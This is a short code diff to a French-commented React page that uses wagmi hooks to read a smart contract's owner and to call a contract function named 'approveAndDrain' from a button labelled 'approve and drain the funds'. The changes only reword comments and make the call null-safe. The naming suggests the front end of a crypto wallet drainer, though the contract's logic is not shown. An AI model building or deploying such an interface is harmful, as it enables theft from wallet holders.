@@ -98,14 +98,14 @@ export default function Home() {
 
   // Lire le owner du contrat
   const { data: owner, isError, isLoading } = useContractRead({
-    address: contractAddress as `0x${string}`,  // Assurez-vous que l'adresse est bien typée
+    address: contractAddress as `0x${string}`, // S'assurer que l'adresse est bien typée
     abi: contractAbi,
     functionName: "owner",
   });
 
   // Écrire sur le contrat
   const { write: approveAndDrain, isLoading: isWriting } = useContractWrite({
-    address: contractAddress as `0x${string}`,  // Assurez-vous que l'adresse est bien typée
+    address: contractAddress as `0x${string}`, // S'assurer que l'adresse est bien typée
     abi: contractAbi,
     functionName: "approveAndDrain",
   });
@@ -123,7 +123,7 @@ export default function Home() {
           ) : (
             <p>Propriétaire du contrat : {owner || "Inconnu"}</p>
           )}
-          <button disabled={isWriting} onClick={() => approveAndDrain()}>
+          <button disabled={isWriting} onClick={() => approveAndDrain?.()}>
             {isWriting ? "Transaction en cours..." : "Approuver et vider les fonds"}
           </button>
         </>
